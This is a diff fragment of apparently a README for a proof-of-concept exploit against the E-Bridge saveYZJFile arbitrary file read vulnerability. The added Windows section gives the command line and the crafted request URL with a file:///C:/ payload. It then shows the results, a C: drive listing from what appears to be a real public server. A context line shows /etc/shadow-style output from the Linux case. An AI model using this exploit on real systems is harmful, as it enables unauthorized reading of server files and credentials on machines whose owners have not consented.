@@ -39,3 +39,31 @@ adm:*:15980:0:99999:7:::
 ......
 ```
 
+Windows系统
+```shell
+python poc.py -i http://xx.xx.xx.xx:8088 -t C:\
+
+[+] E-Bridge saveYZJFile任意文件读取漏洞 OS: windows http://47.111.163.90:8088/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt
+[+] http://47.111.163.90:8088 maybe vulnerable
+
+------------results------------
+$Recycle.Bin
+360SANDBOX
+Boot
+bootmgr
+Config.Msi
+Documents and Settings
+inetpub
+pagefile.sys
+PerfLogs
+ProgramData
+Program Files
+Program Files (x86)
+Recovery
+System Volume Information
+Users
+```
+
+
+
+
